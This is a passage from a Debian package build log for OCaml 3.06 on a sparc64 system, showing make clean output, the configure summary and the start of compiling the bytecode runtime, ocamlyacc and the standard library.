`/home/luther/ocaml-3.06/otherlibs/labltk/camltk'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/labltk'\n/usr/bin/make -f Makefile.gen clean\nmake[4]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/labltk'\nrm -f *.cm* *.ml *.mli *.o *.a\nmake[4]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/labltk'\nrm -f .depend\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/labltk'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/examples_camltk'\nrm -f *.cm?  addition eyes fileinput fileopen helloworld jptest mytext tetris winskel\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/examples_camltk'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/browser'\nrm -f *.cm? ocamlbrowser dummy.mli *~ *.orig\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/browser'\nmv README.labltk README\nmv labltk/.depend.original labltk/.depend\nmv: cannot stat `labltk/.depend.original': No such file or directory\nmake[2]: [partialclean] Error 1 (ignored)\nmv camltk/.depend.original camltk/.depend\nmv: cannot stat `camltk/.depend.original': No such file or directory\nmake[2]: [partialclean] Error 1 (ignored)\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk'\ncd debugger; /usr/bin/make clean\nmake[2]: Entering directory `/home/luther/ocaml-3.06/debugger'\nrm -f ocamldebug\nrm -f *.cmo *.cmi\nrm -f lexer.ml\nrm -f parser.ml parser.mli\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/debugger'\ncd camlp4; /usr/bin/make clean\nmake[2]: Entering directory `/home/luther/ocaml-3.06/camlp4'\n/usr/bin/make clean_hot clean_cold\nmake[3]: Entering directory `/home/luther/ocaml-3.06/camlp4'\nfor i in odyl camlp4 meta etc top ocpp lib man compile; do (cd $i; /usr/bin/make clean); done\nmake[4]: Entering directory `/home/luther/ocaml-3.06/camlp4/odyl'\nrm -f *.cm* *.pp[io] *.o *.bak .*.bak *.out *.opt *.a\nrm -f odyl_config.ml odyl\nmake[4]: Leaving directory `/home/luther/ocaml-3.06/camlp4/odyl'\nmake[4]: Entering directory `/home/luther/ocaml-3.06/camlp4/camlp4'\nrm -f *.cm* *.pp[io] *.o *.bak .*.bak *.out *.opt\nrm -f camlp4 crc.ml\nrm -f camlp4.a\nmake[4]: Leaving directory `/home/luther/ocaml-3.06/camlp4/camlp4'\nmake[4]: Entering directory `/home/luther/ocaml-3.06/camlp4/meta'\nrm -f *.cm* *.pp[io] *.o *.bak .*.bak q_MLast.cmo pa_r.cmo pa_rp.cmo pa_extend.cmo pa_extend_m.cmo pa_ifdef.cmo pr_dump.cmo camlp4r camlp4r.opt\nmake[4]: Leaving directory `/home/luther/ocaml-3.06/camlp4/meta'\nmake[4]: Entering directory `/home/luther/ocaml-3.06/camlp4/etc'\nrm -f *.cm* *.pp[io] *.o *.bak .*.bak *.out *.opt\nrm -f mkcamlp4.sh camlp4o\nmake[4]: Leaving directory `/home/luther/ocaml-3.06/camlp4/etc'\nmake[4]: Entering directory `/home/luther/ocaml-3.06/camlp4/top'\nrm -f *.cm[ioa] *.pp[io] *.o *.bak .*.bak camlp4o.cma camlp4r.cma camlp4_top.cma\nmake[4]: Leaving directory `/home/luther/ocaml-3.06/camlp4/top'\nmake[4]: Entering directory `/home/luther/ocaml-3.06/camlp4/ocpp'\nrm -f *.cm[ioa] *.pp[io] *.o *.out *.bak .*.bak crc.ml ocpp\nmake[4]: Leaving directory `/home/luther/ocaml-3.06/camlp4/ocpp'\nmake[4]: Entering directory `/home/luther/ocaml-3.06/camlp4/lib'\nrm -f *.cm[ioax] *.cmxa *.pp[io] *.o *.a *.bak .*.bak gramlib.cma\nmake[4]: Leaving directory `/home/luther/ocaml-3.06/camlp4/lib'\nmake[4]: Entering directory `/home/luther/ocaml-3.06/camlp4/man'\nrm -f camlp4.1\nmake[4]: Leaving directory `/home/luther/ocaml-3.06/camlp4/man'\nmake[4]: Entering directory `/home/luther/ocaml-3.06/camlp4/compile'\nrm -f *.cm* *.pp[io] *.o *.bak .*.bak *.out *.opt\nrm -f *.fast tmp.* pa_*_fast.ml *_fast.ml\nmake[4]: Leaving directory `/home/luther/ocaml-3.06/camlp4/compile'\nfor i in odyl camlp4 meta lib; do \\\n\t(cd ocaml_src/$i; /usr/bin/make clean); \\\ndone\nmake[4]: Entering directory `/home/luther/ocaml-3.06/camlp4/ocaml_src/odyl'\nrm -f *.cm* *.pp[io] *.o *.bak .*.bak *.out *.opt *.a\nrm -f odyl_config.ml odyl\nmake[4]: Leaving directory `/home/luther/ocaml-3.06/camlp4/ocaml_src/odyl'\nmake[4]: Entering directory `/home/luther/ocaml-3.06/camlp4/ocaml_src/camlp4'\nrm -f *.cm* *.pp[io] *.o *.bak .*.bak *.out *.opt\nrm -f camlp4 crc.ml\nmake[4]: Leaving directory `/home/luther/ocaml-3.06/camlp4/ocaml_src/camlp4'\nmake[4]: Entering directory `/home/luther/ocaml-3.06/camlp4/ocaml_src/meta'\nrm -f *.cm* *.pp[io] *.o *.bak .*.bak q_MLast.cmo pa_r.cmo pa_rp.cmo pa_extend.cmo pa_extend_m.cmo pa_ifdef.cmo pr_dump.cmo camlp4r camlp4r.opt\nmake[4]: Leaving directory `/home/luther/ocaml-3.06/camlp4/ocaml_src/meta'\nmake[4]: Entering directory `/home/luther/ocaml-3.06/camlp4/ocaml_src/lib'\nrm -f *.cm[ioax] *.cmxa *.pp[io] *.o *.a *.bak .*.bak gramlib.cma\nmake[4]: Leaving directory `/home/luther/ocaml-3.06/camlp4/ocaml_src/lib'\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/camlp4'\nrm -f boot/*.cm[oi] boot/camlp4*\nrm -rf boot/SAVED\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/camlp4'\nrm -f utils/*.cm[iox] utils/*.[so] utils/*~\nrm -f parsing/*.cm[iox] parsing/*.[so] parsing/*~\nrm -f typing/*.cm[iox] typing/*.[so] typing/*~\nrm -f bytecomp/*.cm[iox] bytecomp/*.[so] bytecomp/*~\nrm -f asmcomp/*.cm[iox] asmcomp/*.[so] asmcomp/*~\nrm -f driver/*.cm[iox] driver/*.[so] driver/*~\nrm -f toplevel/*.cm[iox] toplevel/*.[so] toplevel/*~\nrm -f tools/*.cm[iox] tools/*.[so] tools/*~\nrm -f *~\ncd byterun; /usr/bin/make clean\nmake[2]: Entering directory `/home/luther/ocaml-3.06/byterun'\nrm -f ocamlrun ocamlrund *.o lib*.a\nrm -f primitives prims.c opnames.h jumptbl.h\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/byterun'\nrm -f stdlib/libcamlrun.a\nrm -f stdlib/caml\ncd asmrun; /usr/bin/make clean\nmake[2]: Entering directory `/home/luther/ocaml-3.06/asmrun'\nrm -f misc.c freelist.c major_gc.c minor_gc.c memory.c alloc.c array.c compare.c ints.c floats.c str.c io.c extern.c intern.c hash.c sys.c parsing.c gc_ctrl.c terminfo.c md5.c obj.c lexing.c printexc.c callback.c weak.c compact.c finalise.c meta.c custom.c main.c globroots.c unix.c dynlink.c\nrm -f *.o *.a *~\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/asmrun'\nrm -f stdlib/libasmrun.a\ncd yacc; /usr/bin/make clean\nmake[2]: Entering directory `/home/luther/ocaml-3.06/yacc'\nrm -f *.o ocamlyacc *~\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/yacc'\nfor i in unix str num dynlink bigarray systhreads graph dbm labltk; do (cd otherlibs/$i; /usr/bin/make clean); done\nmake[2]: Entering directory `/home/luther/ocaml-3.06/otherlibs/unix'\nrm -f *.cm*\nrm -f *.a *.o *.so\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/unix'\nmake[2]: Entering directory `/home/luther/ocaml-3.06/otherlibs/str'\nrm -f *.cm*\nrm -f *.a *.so *.o\ncd regex-0.12; if test -f Makefile; then /usr/bin/make distclean; else exit 0; fi\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/str/regex-0.12'\nrm -f *.o\nrm -f Makefile config.status\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/str/regex-0.12'\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/str'\nmake[2]: Entering directory `/home/luther/ocaml-3.06/otherlibs/num'\nrm -f *.cm*\nrm -f *.a *.o *.so\ncd bignum; /usr/bin/make scratch\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/num/bignum'\nrm -f ,* .,* *~ #*# .emacs_[0-9]* *.BAK *.CKP core a.out\nrm -f */,* */.,* */*~ */#*# */.emacs_[0-9]* */*.BAK */*.CKP\nrm -f o/*.o libbignum.a bztest testKerN\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/num/bignum'\ncd test; /usr/bin/make clean\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/num/test'\nrm -f test.byt test.opt *.o *.cm? ocamlnum\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/num/test'\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/num'\nmake[2]: Entering directory `/home/luther/ocaml-3.06/otherlibs/dynlink'\nrm -f extract_crc *.cm[ioa]\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/dynlink'\nmake[2]: Entering directory `/home/luther/ocaml-3.06/otherlibs/bigarray'\nrm -f *.cm* \nrm -f libbigarray.* *.o bigarray.a *.so\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/bigarray'\nmake[2]: Entering directory `/home/luther/ocaml-3.06/otherlibs/systhreads'\nrm -f *.cm*\nrm -f libthreads*.a *.o threads.a\nrm -f thread.ml\nrm -f dllthreads.so\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/systhreads'\nmake[2]: Entering directory `/home/luther/ocaml-3.06/otherlibs/graph'\nrm -f *.cm*\nrm -f *.a *.so *.o\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/graph'\nmake[2]: Entering directory `/home/luther/ocaml-3.06/otherlibs/dbm'\nrm -f *.cm*\nrm -f *.a *.o *.so\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/dbm'\nmake[2]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk'\nfor d in compiler support lib jpf frx tkanim examples_labltk camltk labltk examples_camltk browser; do \\\n    cd $d; /usr/bin/make -f Makefile clean; cd ..; \\\ndone\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/compiler'\nrm -f *.cm* parser.ml parser.mli lexer.ml copyright.ml\nrm -f pplex.ml ppyac.ml ppyac.mli ppyac.output\nrm -f tkcompiler pp parser.output\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/compiler'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/support'\nrm -f *.cm* *.o *.a *.so\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/support'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/lib'\nrm -f labltktop labltk *.cm* *.a\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/lib'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/jpf'\nrm -f *.cm* *.o *.a *~ *test\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/jpf'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/frx'\nrm -f *.cm* *.o *.a\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/frx'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/tkanim'\nrm -f *.cm* *.o *.a dlltkanim.so animwish gifanimtest\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/tkanim'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/examples_labltk'\nrm -f hello demo eyes calc clock tetris lang *.opt *.o *.cm*\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/examples_labltk'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/camltk'\nMakefile:46: .depend: No such file or directory\nmake[3]: *** No rule to make target `.depend'.  Stop.\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/camltk'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/labltk'\nMakefile:44: .depend: No such file or directory\nmake[3]: *** No rule to make target `.depend'.  Stop.\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/labltk'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/examples_camltk'\nrm -f *.cm?  addition eyes fileinput fileopen helloworld jptest mytext tetris winskel\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/examples_camltk'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/browser'\nrm -f *.cm? ocamlbrowser dummy.mli *~ *.orig\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/browser'\nmv README.labltk README\nmv: cannot stat `README.labltk': No such file or directory\nmake[2]: [clean] Error 1 (ignored)\nmv labltk/.depend.original labltk/.depend\nmv: cannot stat `labltk/.depend.original': No such file or directory\nmake[2]: [clean] Error 1 (ignored)\nmv camltk/.depend.original camltk/.depend\nmv: cannot stat `camltk/.depend.original': No such file or directory\nmake[2]: [clean] Error 1 (ignored)\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk'\nmake[1]: Leaving directory `/home/luther/ocaml-3.06'\nif test -d boot.debian; then \t\t\t\t\\\n\trm -rf boot;\t\t\t\t\t\\\n\tmv boot.debian boot;\t\t\t\t\\\nfi\n/usr/bin/make -C emacs clean\nmake[1]: Entering directory `/home/luther/ocaml-3.06/emacs'\nrm -f ocamltags *~ #*#\nmake[1]: Leaving directory `/home/luther/ocaml-3.06/emacs'\ndh_clean config/Makefile config/s.h config/m.h \t\t\\\n\tdebian/ocaml-ldconf debian/ocaml-ldconf.cmi\t\\\n\tdebian/ocaml-ldconf.cmo debian/dh_ocamlld.1\t\\\n\tcamlp4/config/Makefile camlp4/config/Makefile.cnf\n dpkg-source -b ocaml-3.06\ndpkg-source: building ocaml using existing ocaml_3.06.orig.tar.gz\ndpkg-source: building ocaml in ocaml_3.06-15.diff.gz\ndpkg-source: warning: ignoring deletion of file otherlibs/labltk/camltk/.depend\ndpkg-source: warning: ignoring deletion of file otherlibs/labltk/labltk/.depend\ndpkg-source: building ocaml in ocaml_3.06-15.dsc\n debian/rules build\ndh_testdir\n# Add here commands to configure the package.\n./configure --with-pthread -prefix /usr\t\t\t\t\\\n-cc /usr/bin/gcc-3.2\t\t\t\t\t\\\n-mandir /usr/share/man\t\t\t\t\t\\\n-tkdefs \"-I/usr/include/tcl8.3\"\t\t\t\t\\\n\t-tklibs \"-L/usr/lib -ltk8.3 -ltcl8.3\"\nConfiguring for a sparc64-unknown-linux-gnu ...\nThe C compiler is ANSI-compliant.\nChecking the sizes of integers and pointers...\nOK, this is a regular 32 bit architecture.\n64-bit \"long long\" integer type found (printf with \"%ll\").\nThis is a big-endian architecture.\nDoubles can be word-aligned.\n64-bit integers must be doubleword-aligned.\nNative division and modulus have round-towards-zero semantics, will use them.\nDynamic loading of shared libraries is supported.\nranlib found\n#! appears to work in shell scripts\nPOSIX signal handling found.\nstrerror() found.\ntimes() found.\ntermcap functions found (with libraries '-lcurses')\nYou have BSD sockets.\nsocklen_t is defined in <sys/socket.h>\ninet_aton() found.\nunistd.h found.\noff_t is defined in <sys/types.h>\ndirent.h found.\nrewinddir() found.\nlockf() found.\nmkfifo() found.\ngetcwd() found.\ngetwd() found.\ngetpriority() found.\nutime() found.\nutimes() found.\ndup2() found.\nfchmod() found.\ntruncate() found.\nsys/select.h found.\nselect() found.\nsymlink() found.\nwaitpid() found.\nwait4() found.\ngetgroups() found.\nPOSIX termios found.\nsetitimer() found.\ngethostname() found.\nuname() found.\ngettimeofday() found.\nmktime() found.\nsetsid() found.\nputenv() found.\nsetlocale() and <locale.h> found.\ndlopen() found.\nmmap() found.\ngethostbyname_r() found (with 6 arguments).\ngethostbyaddr_r() found (with 8 arguments).\nReplay debugger supported.\nCannot detect system stack overflow.\nThreads library supported (using POSIX system threads).\nOptions for linking with POSIX threads: -lpthread\nLocation of X11 include files: /usr/X11R6/include/X11\nOptions for linking with X11: -L/usr/X11R6/lib -lX11\nNDBM found (in /usr/include)\nConfiguring LablTk...\ntcl.h version 8.3 found.\ntk.h found.\nTcl/Tk libraries found.\n\n** Configuration summary **\n\nDirectories where Objective Caml will be installed:\n        binaries.................. /usr/bin\n        standard library.......... /usr/lib/ocaml/3.06\n        manual pages.............. /usr/share/man (with extension .1)\nConfiguration for the bytecode compiler:\n        C compiler used........... /usr/bin/gcc-3.2\n        options for compiling.....  -D_FILE_OFFSET_BITS=64 -D_REENTRANT\n        options for linking.......  -Wl,-E  -lm -ldl -lcurses -lpthread\n        shared libraries are supported\n        options for compiling..... -fPIC  -D_FILE_OFFSET_BITS=64 -D_REENTRANT\n        command for building...... /usr/bin/gcc-3.2 -shared -o lib.so -Wl,-rpath,/a/path objs\nConfiguration for the native-code compiler:\n        (not supported on this platform)\nSource-level replay debugger: supported\nAdditional libraries supported:\n        unix str num dynlink bigarray systhreads graph dbm labltk\nConfiguration for the \"num\" library:\n        target architecture ...... C\nConfiguration for the \"graph\" library:\n        options for compiling .... -I/usr/X11R6/include\n        options for linking ...... -L/usr/X11R6/lib -lX11\nConfiguration for the \"labltk\" library:\n        use tcl/tk version ....... 8.3\n        options for compiling .... -I/usr/include/tcl8.3\n        options for linking ...... -L/usr/lib -ltk8.3 -ltcl8.3 -ldl\nsed -e \"s%MANDIR=.*$%MANDIR=\\$(PREFIX)/share/man%g\"      \t\\\n\tconfig/Makefile >config/Makefile.debian\nmv config/Makefile.debian config/Makefile\nif test -z `grep \"OTHERLIBRARIES.*labltk\" config/Makefile`; then\\\n\techo \"Error, labltk library was not built\";\t\t\\\n\techo \"Check your tcl/tk development packages\";\t\t\\\n\techo \"Aborting.\";\t\t\t\t\t\\\n\texit 1;\t\t\t\t\t\t\t\\\nfi\n/bin/sh: line 1: test: too many arguments\ntouch configure-stamp\ndh_testdir\n# Add here commands to compile the package.\nif test ! -d boot.debian; then \t\t\t\t\t\\\n\tcp -xa boot boot.debian;\t\t\t\t\\\nfi\n/usr/bin/make world bootstrap\nmake[1]: Entering directory `/home/luther/ocaml-3.06'\ncd byterun; /usr/bin/make all\nmake[2]: Entering directory `/home/luther/ocaml-3.06/byterun'\nsed -n -e '/^  /s/ \\([A-Z]\\)/ \\&\\&lbl_\\1/gp' \\\n       -e '/^}/q' instruct.h > jumptbl.h\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o interp.o interp.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o misc.o misc.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o stacks.o stacks.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o fix_code.o fix_code.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o startup.o startup.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o main.o main.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o freelist.o freelist.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o major_gc.o major_gc.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o minor_gc.o minor_gc.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o memory.o memory.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o alloc.o alloc.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o roots.o roots.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o globroots.o globroots.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o fail.o fail.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o signals.o signals.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o printexc.o printexc.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o backtrace.o backtrace.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o compare.o compare.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o ints.o ints.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o floats.o floats.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o str.o str.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o array.o array.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o io.o io.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o extern.o extern.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o intern.o intern.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o hash.o hash.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o sys.o sys.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o meta.o meta.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o parsing.o parsing.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o gc_ctrl.o gc_ctrl.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o terminfo.o terminfo.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o md5.o md5.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o obj.o obj.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o lexing.o lexing.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o callback.o callback.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o debugger.o debugger.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o weak.o weak.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o compact.o compact.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o finalise.o finalise.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o custom.o custom.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o dynlink.o dynlink.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o unix.o unix.c\nar rc libcamlrun.a interp.o misc.o stacks.o fix_code.o startup.o main.o freelist.o major_gc.o minor_gc.o memory.o alloc.o roots.o globroots.o fail.o signals.o printexc.o backtrace.o compare.o ints.o floats.o str.o array.o io.o extern.o intern.o hash.o sys.o meta.o parsing.o gc_ctrl.o terminfo.o md5.o obj.o lexing.o callback.o debugger.o weak.o compact.o finalise.o custom.o dynlink.o unix.o\nranlib libcamlrun.a\nsed -n -e \"s/CAMLprim value \\([a-z0-9_][a-z0-9_]*\\).*/\\1/p\" \\\n    alloc.c array.c compare.c extern.c floats.c gc_ctrl.c hash.c intern.c interp.c ints.c io.c lexing.c md5.c meta.c obj.c parsing.c signals.c str.c sys.c terminfo.c callback.c weak.c finalise.c stacks.c dynlink.c > primitives\n(echo '#include \"mlvalues.h\"'; \\\n echo '#include \"prims.h\"'; \\\n sed -e 's/.*/extern value &();/' primitives; \\\n echo 'c_primitive builtin_cprim[] = {'; \\\n sed -e 's/.*/\t&,/' primitives; \\\n echo '\t 0 };'; \\\n echo 'char * names_of_builtin_cprim[] = {'; \\\n sed -e 's/.*/\t\"&\",/' primitives; \\\n echo '\t 0 };') > prims.c\n/usr/bin/gcc-3.2 -O -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o prims.o prims.c\n/usr/bin/gcc-3.2 -D_FILE_OFFSET_BITS=64 -D_REENTRANT -Wl,-E -o ocamlrun \\\n          prims.o libcamlrun.a -lm -ldl -lcurses -lpthread\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/byterun'\ncp byterun/ocamlrun boot/ocamlrun\ncd yacc; /usr/bin/make all\nmake[2]: Entering directory `/home/luther/ocaml-3.06/yacc'\n/usr/bin/gcc-3.2 -O -DNDEBUG -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o closure.o closure.c\n/usr/bin/gcc-3.2 -O -DNDEBUG -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o error.o error.c\n/usr/bin/gcc-3.2 -O -DNDEBUG -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o lalr.o lalr.c\n/usr/bin/gcc-3.2 -O -DNDEBUG -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o lr0.o lr0.c\n/usr/bin/gcc-3.2 -O -DNDEBUG -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o main.o main.c\n/usr/bin/gcc-3.2 -O -DNDEBUG -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o mkpar.o mkpar.c\n/usr/bin/gcc-3.2 -O -DNDEBUG -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o output.o output.c\n/usr/bin/gcc-3.2 -O -DNDEBUG -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o reader.o reader.c\n/usr/bin/gcc-3.2 -O -DNDEBUG -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o skeleton.o skeleton.c\n/usr/bin/gcc-3.2 -O -DNDEBUG -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o symtab.o symtab.c\n/usr/bin/gcc-3.2 -O -DNDEBUG -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o verbose.o verbose.c\n/usr/bin/gcc-3.2 -O -DNDEBUG -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o warshall.o warshall.c\n/usr/bin/gcc-3.2 -O -DNDEBUG -D_FILE_OFFSET_BITS=64 -D_REENTRANT  -o ocamlyacc closure.o error.o lalr.o lr0.o main.o mkpar.o output.o reader.o skeleton.o symtab.o verbose.o warshall.o\nmain.o(.text+0x608): In function `create_file_names':\n: the use of `mktemp' is dangerous, better use `mkstemp'\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/yacc'\ncp yacc/ocamlyacc boot/ocamlyacc\ncd stdlib; /usr/bin/make COMPILER=../boot/ocamlc all\nmake[2]: Entering directory `/home/luther/ocaml-3.06/stdlib'\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib -nopervasives -c pervasives.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib -nopervasives -c pervasives.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c array.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c array.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c list.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c list.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c char.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c char.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c string.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c string.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c sys.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c sys.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c hashtbl.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c hashtbl.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c sort.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c sort.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c marshal.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c marshal.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c obj.mli\n../boot/ocamlrun 